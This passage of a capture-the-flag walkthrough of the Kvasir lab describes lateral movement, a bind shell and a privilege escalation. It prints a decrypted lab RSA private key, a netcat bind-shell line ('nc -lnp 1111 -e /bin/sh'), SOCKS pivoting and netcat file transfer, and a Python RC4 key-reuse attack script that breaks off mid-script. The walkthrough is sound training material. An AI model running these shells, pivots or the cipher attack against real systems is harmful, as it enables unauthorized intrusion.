-cB0lnemI+cFmfY74F1eYL3fwJIwSRgK85Xc2My8sqJz1izj6IlO2kQ1jLkrhJOZ8
-X+p/9w5zA0x2fbjppHac+YoJfyPyYXjkpigDPjHXhRit2qnUrHfDc0Fjh5AKNU2K
-MU/ywXGEg6w0CppK9JBo0u/xJlhT/jOWNiM4YZjXlhQzkxyebvbyRS6Slhlo142l
-gMuMUvPn1fAenir6AFwy2rlktQ5/a8z2VCwPkNA40MImSHMWRSFboDjM5zwr24Gk
-N0pI1BCmCsf0msvEwLhdcVnhJY7Bg4izm5bX+ArV/ymLOkybK8chz5fryXcjeV1q
-izJe2AXZk1/8hY80tvJWjxUEfnguyoozQf5T74mn5aez9JgGWMqzpfKwZ6Lx5cTg
-Zu+m+ryakBPFjUtt04lCYCCKWQzPhgIr5xUFx62hCGhh6W8tSIB6k7Hpun123GQ0
-uT+R0ErYA5Gdyx44FZEatZ3rXCpVmJllCTWUqBuaHYAtcZThTTZfxRFHy02IT6FW
-PLCZ/XN2E+TdtkXmFcTXRsgtyA/5VXsTWWmRcHczv5g5YcQ3pHs3MhSxsWSdTz/8
-RYzmxOnCjZWXaUe0Xb7FjA/evmpXsyhChGbvp0K0hZFcMeszFKa8K4pAedcyG31n
-4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
-DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
-JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
------END RSA PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:# openssl rsa -in terra_key -out terra_key_nopass
-Enter pass phrase for terra_key: # entered Nk9yY31hva8q
-writing RSA key
-
-root@kali:~# cat terra_key_nopass
------BEGIN RSA PRIVATE KEY-----
-MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
-w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
-DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
-12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
-sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
-b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
-fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
-KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
-KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
-5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
-P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
-ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
-bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
-JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
-cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
-gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
-+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
-agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
-pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
-ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
-WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
-7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
-W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
-bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
-mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
------END RSA PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Considering that &lt;strong&gt;192.168.3.50&lt;/strong&gt; was named as &lt;code&gt;terra&lt;/code&gt; in that &lt;code&gt;/etc/hosts&lt;/code&gt; file, I attempted authentication using this key on it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass
-ProxyChains-3.1 (http://proxychains.sf.net)
-Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-You have mail.
-Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
-terra@dev2:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As you can see, I also opened another socks proxy locally on port &lt;code&gt;tcp/8001&lt;/code&gt; in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to &lt;code&gt;dev2&lt;/code&gt; in red:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_5.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;h2 id=&#34;letting-myself-in-via-the-back-door&#34;&gt;letting myself in via the back door&lt;/h2&gt;
-
-&lt;p&gt;Enumerating &lt;code&gt;dev2&lt;/code&gt; did not reveal much interesting information. In fact, the most important clue found was in a mail for &lt;code&gt;terra&lt;/code&gt; from Locke:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;terra@dev2:~$ cat /var/spool/mail/terra
-Return-path: &amp;lt;locke@192.168.4.100&amp;gt;
-Received: from locke by 192.168.4.100 with local (Exim 4.80)
-~       (envelope-from &amp;lt;locke@adm&amp;gt;)
-~       id 1XHczw-0000V2-8y
-~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100
-
-Date: Wed, 13 Aug 2014 19:10:08 +0100
-To: terra@192.168.3.50
-Subject: Port Knock
-User-Agent: Heirloom mailx 12.5 6/20/10
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Message-Id: &amp;lt;E1XHczw-0000V2-8y@adm&amp;gt;
-From: locke@192.168.4.100
-~
-Hi Terra,
-
-I&#39;ve been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
-Let me know how it goes.
-
-Regards,
-Locke
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on &lt;strong&gt;192.168.4.100&lt;/strong&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
-# socks5    127.0.0.1 8001
-
-# scans will appear to be coming from 192.168.4.50 for
-# 192.168.4.100
-root@kali:~# proxychains nmap -sT 192.168.4.100
-ProxyChains-3.1 (http://proxychains.sf.net)
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:39 SAST
-Nmap scan report for 192.168.4.100
-Host is up (0.0018s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE
-22/tcp open  ssh
-
-Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Only &lt;code&gt;tcp/22&lt;/code&gt;. :s&lt;/p&gt;
-
-&lt;p&gt;I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in &lt;a href=&#34;http://vulnhub.com/entry/knock-knock-11,105/&#34;&gt;Knock Knock&lt;/a&gt; (&lt;code&gt;knockd&lt;/code&gt;), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file &lt;a href=&#34;https://github.com/jvinet/knock/blob/master/knockd.conf&#34;&gt;here&lt;/a&gt;, which revealed the default sequence of: &lt;code&gt;7000,8000,9000&lt;/code&gt;. So, I tested this by attempting to connect with &lt;code&gt;nc&lt;/code&gt; to these ports on &lt;strong&gt;192.168.4.100&lt;/strong&gt;, and following up with a nmap:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
-192.168.4.100: inverse host lookup failed: Host name lookup failure
-(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
-192.168.4.100: inverse host lookup failed: Host name lookup failure
-(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
-192.168.4.100: inverse host lookup failed: Host name lookup failure
-(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
-terra@dev2:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The nmap after the knock:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nmap -sT 192.168.4.100
-ProxyChains-3.1 (http://proxychains.sf.net)
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:45 SAST
-Nmap scan report for 192.168.4.100
-Host is up (0.0015s latency).
-Not shown: 998 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-1111/tcp open  lmsocialserver
-
-Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A new port! &lt;code&gt;tcp/1111&lt;/code&gt; :) Lets check it out.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc 192.168.4.100 1111
-ProxyChains-3.1 (http://proxychains.sf.net)
-
-# a new connection has no output. Only after typing
-# &#39;crap&#39; do you realise you have a sh session open
-
-id
-uid=1000(locke) gid=1000(locke) groups=1000(locke)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Shell access as &lt;code&gt;locke&lt;/code&gt; on &lt;strong&gt;192.168.4.100&lt;/strong&gt;. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&amp;hellip; The new connection denoted in red again:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_6.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;h2 id=&#34;busting-kefka&#34;&gt;busting kefka&lt;/h2&gt;
-
-&lt;p&gt;The shell on &lt;code&gt;adm&lt;/code&gt; as &lt;code&gt;locke&lt;/code&gt; was nothing more than a &lt;code&gt;/bin/sh&lt;/code&gt; instance executed over &lt;code&gt;netcat&lt;/code&gt;. This can be seen in the &lt;code&gt;littleShell.sh&lt;/code&gt; file in &lt;code&gt;/home/locke&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat littleShell.sh
-#!/bin/sh
-
-/bin/nc -lnp 1111 -e &#39;/bin/sh&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Other interesting files were all in &lt;code&gt;locke&lt;/code&gt;&amp;rsquo;s home directory:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pwd
-/home/locke
-ls -lh
-total 332K
--rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
--rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
--rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The &lt;code&gt;note.txt&lt;/code&gt; file:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat note.txt
-Looks like Kefka may have been abusing our removable media policy.  I&#39;ve extracted this image to have a look.
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the &lt;code&gt;diskimage.tar.gz&lt;/code&gt; file to progress. The first thing I had to do was get a local copy of &lt;code&gt;diskimage.tar.gz&lt;/code&gt;. Out comes &lt;code&gt;netcat&lt;/code&gt; again :) I hosted the file on &lt;code&gt;tcp/4444&lt;/code&gt; on &lt;strong&gt;192.168.4.100&lt;/strong&gt; with &lt;code&gt;nc -lvp 4444 &amp;lt; diskimage.tar.gz | xxd -p&lt;/code&gt;. I then read the file on my attacking machine with &lt;code&gt;timeout 5 proxychains nc 192.168.4.100 4444 &amp;gt; diskimage.tar.gz&lt;/code&gt; (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).&lt;/p&gt;
-
-&lt;p&gt;I had to carve out the string &lt;em&gt;ProxyChains-3.1 (&lt;a href=&#34;http://proxychains.sf.net&#34;&gt;http://proxychains.sf.net&lt;/a&gt;)&lt;/em&gt; out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple &lt;code&gt;dd&lt;/code&gt; on the top line and it was gone :)&lt;/p&gt;
-
-&lt;p&gt;I then extracted the archive and ran the resultant archive through &lt;code&gt;file&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tar xvf diskimage.tar.gz
-diskimage
-
-root@kali:~# file -k diskimage
-diskimage: x86 boot sector, code offset 0x3c, OEM-ID &amp;quot;MSDOS5.0&amp;quot;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &amp;gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ok, so this really looks like a disk image. I decided to mount it and have a look inside:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# mount diskimage /mnt/
-
-root@kali:~# ls -lah /mnt/
-total 21K
-drwxr-xr-x  2 root root  16K Jan  1  1970 .
-drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
--rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar
-
-# oh! a .rar? Lets extract...
-root@kali:~# unrar x /mnt/Secret.rar
-
-UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
-
-
-Extracting from /mnt/Secret.rar
-
-Enter password (will not be echoed) for MyPassword.txt:
-
-No files to extract
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A &lt;code&gt;.rar&lt;/code&gt; archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&amp;hellip;&lt;/p&gt;
-
-&lt;p&gt;Some googling around got me a hit on a tool called &lt;code&gt;autopsy&lt;/code&gt;, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_autospy.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;&lt;code&gt;C:/Funky.wav&lt;/code&gt;. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the &lt;em&gt;Export&lt;/em&gt; link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.&lt;/p&gt;
-
-&lt;p&gt;It sounded like this:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_wut_sound.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Yeah, I don&amp;rsquo;t get it either. I was stumped for a few minutes again, until I remembered &lt;a href=&#34;http://vulnhub.com/entry/xerxes-201,97/&#34;&gt;Xerxes2&lt;/a&gt;, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by &lt;a href=&#34;http://www.sonicvisualiser.org/index.html&#34;&gt;Sonic Visualizer&lt;/a&gt;. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_sonic_viz.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;&lt;em&gt;OrcWQi5VhfCo&lt;/em&gt;. Was this the password for the &lt;code&gt;.rar&lt;/code&gt; archive?&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# unrar x /mnt/Secret.rar
-
-UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal
-
-
-Extracting from /mnt/Secret.rar
-
-Enter password (will not be echoed) for MyPassword.txt:
-
-Extracting  MyPassword.txt                                            OK
-All OK
-root@kali:~# cat MyPassword.txt
-5224XbG5ki2C
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Yep! However, another random string. Remembering the note about this being a disk image from &lt;code&gt;kefka&lt;/code&gt;, I attempted to SSH into &lt;strong&gt;192.168.4.100&lt;/strong&gt; as &lt;code&gt;kefka&lt;/code&gt; with this password:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
-ProxyChains-3.1 (http://proxychains.sf.net)
-kefka@192.168.4.100&#39;s password: # entered 5224XbG5ki2C
-Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
-kefka@adm:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A final &lt;code&gt;tcp/8002&lt;/code&gt; proxy was opened on my attacking machine.&lt;/p&gt;
-
-&lt;h2 id=&#34;taking-the-last-ride-to-the-flag&#34;&gt;taking the last ride to the flag&lt;/h2&gt;
-
-&lt;p&gt;Enumeration as kefka revealed that this user is allowed to run &lt;code&gt;/opt/wep2.py&lt;/code&gt; as root. This is almost screaming at me as the privilege escalation path!&lt;/p&gt;
-
-&lt;p&gt;I ran the script with sudo, just to be presented with&amp;hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kefka@adm:~$ sudo /opt/wep2.py
-^CTraceback (most recent call last):
-  File &amp;quot;/opt/wep2.py&amp;quot;, line 93, in &amp;lt;module&amp;gt;
-    sock, addr = s.accept()
-  File &amp;quot;/usr/lib/python2.7/socket.py&amp;quot;, line 202, in accept
-    sock, addr = self._sock.accept()
-KeyboardInterrupt
-kefka@adm:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I re-run the script backgrounding it with &lt;code&gt;&amp;amp;&lt;/code&gt;, and inspect the output of &lt;code&gt;netstat -pant&lt;/code&gt; to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new &lt;code&gt;tcp/8002&lt;/code&gt; proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
-# socks5    127.0.0.1 8002
-
-# connections will appear to be coming from localhost
-root@kali:~# proxychains nc -v 127.0.0.1 1234
-ProxyChains-3.1 (http://proxychains.sf.net)
-127.0.0.1: inverse host lookup failed:
-(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
-=============================
-Can you retrieve my secret..?
-=============================
-
-Usage:
-&#39;V&#39; to view the encrypted flag
-&#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)
-
-V
-5a5062:36507a63b56865f7fd201860
-^C
-root@kali:~#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We are presented with yet another &lt;em&gt;game&lt;/em&gt;, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the &lt;code&gt;netcat&lt;/code&gt; connection killed, causing me to have to re-run &lt;code&gt;sudo /opt/wep2.py&lt;/code&gt; on the kefka session.&lt;/p&gt;
-
-&lt;p&gt;By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were &lt;code&gt;salt:cyphertext&lt;/code&gt;, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with &lt;em&gt;A&lt;/em&gt;, and studied the output:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;E A
-348bbc:8d
-E A
-f2fb0c:6e
-E A
-64d7fb:2d
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.&lt;/p&gt;
-
-&lt;p&gt;Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename &lt;code&gt;wep2.py&lt;/code&gt; should be taken as a hint!&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 id=&#34;understanding-what-wep-actually-is&#34;&gt;understanding what WEP actually is&lt;/h3&gt;
-
-&lt;p&gt;With the limited interaction I have had with the last game, and the hint &lt;code&gt;wep2&lt;/code&gt;, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.&lt;/p&gt;
-
-&lt;p&gt;Some resources that really helped me get to grips with what we are facing here was:
- &lt;a href=&#34;http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf&#34;&gt;http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf&lt;/a&gt;
- &lt;a href=&#34;http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt&#34;&gt;http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt&lt;/a&gt;
- &lt;a href=&#34;http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt&#34;&gt;http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt&lt;/a&gt;
- &lt;a href=&#34;http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf&#34;&gt;http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;Of the above list, I highly recommend you check out the &lt;code&gt;.ppt&lt;/code&gt;&amp;rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.&lt;/p&gt;
-
-&lt;p&gt;The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let &lt;em&gt;C&lt;/em&gt; be the cipher text and &lt;em&gt;P&lt;/em&gt; be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&amp;rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:&lt;/p&gt;
-
-&lt;blockquote&gt;
-&lt;p&gt;C = P ^ RC4(iv, k)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about &lt;a href=&#34;http://en.wikipedia.org/wiki/Stream_cipher_attack&#34;&gt;Stream Cipher Attacks&lt;/a&gt; and &lt;a href=&#34;http://en.wikipedia.org/wiki/Related-key_attack&#34;&gt;Related Key Attacks&lt;/a&gt;. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.&lt;/p&gt;
-
-&lt;p&gt;My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&amp;rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the &lt;code&gt;2&lt;/code&gt; in &lt;code&gt;wep2&lt;/code&gt; was another troll :)&lt;/p&gt;
-
-&lt;h3 id=&#34;attacking-the-encryption-game&#34;&gt;attacking the encryption game&lt;/h3&gt;
-
-&lt;p&gt;Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.&lt;/p&gt;
-
-&lt;p&gt;I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).&lt;/p&gt;
-
-&lt;p&gt;Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.&lt;/p&gt;
-
-&lt;p&gt;I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&amp;rsquo;s cipher text:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./un_wep-testing.py
-ProxyChains-3.1 (http://proxychains.sf.net)
-[+] Generating base iv:cy dictionary with &#39;A&#39; *24
-[+] iv_dict knows about 5000 combinations
-[+] Starting Bruteforce with &#39;B&#39; *24
-[+] Frame matched IV of 929d87 in 4559 tries!
-[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
-[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48
-
-[+] A ^ B
-BBBBBBBBBBBBBBBBBBBBBBBB
-[+] Done
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.&lt;/p&gt;
-
-&lt;p&gt;With the changes in, I ended up with the following script:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/usr/bin/python
-
-# Kvasir RC4 Key Re-use Attack
-
-import socket
-
-# start a fresh iv_dict used for lookups
-iv_dict = {}
-
-# connection to the thing
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((&#39;127.0.0.1&#39;, 1234))
-
-# read the banner so we can continue
-
-# =============================
-# Can you retrieve my secret..?
-# =============================
-#
-# Usage:
-# &#39;V&#39; to view the encrypted flag
-# &#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)
-banner = sock.recv(1024)
-
-# create some iv:cyper combinations of the flag
-print &#39;[+] Generating base iv:cy dictionary&#39;
-for i in range(0,5000):
-    sock.send(&#39;V\n&#39;)
-    frame = sock.recv(150)
-    iv = frame.split(&#39;:&#39;)[0]
-    cy = frame.split(&#39;:&#39;)[1]
-
-    # add the values
-    iv_dict[iv] = cy.strip()
-print &#39;[+] The iv_dict knows about %d combinations&#39; % len(iv_dict)
-
-# start processing the second string, looking up the IV
-print &#39;[+] Starting Bruteforce with \&#39;B\&#39; *24&#39;
-count = 0
-while True:
-
-    count += 1
-    sock.send(&#39;E &#39; + &#39;B&#39; *24 + &#39;\n&#39;)
-    frame = sock.recv(150)
-    iv = frame.split(&#39;:&#39;)[0]
-    cy = frame.split(&#39;:&#39;)[1].strip() # annoying \n
-
-    if iv in iv_dict:
-        print &#39;[+] Frame matched IV of %s in %d tries!&#39; % (iv, count)
-        print &#39;[+] Base Cyper Text was: %s&#39; % iv_dict[iv]
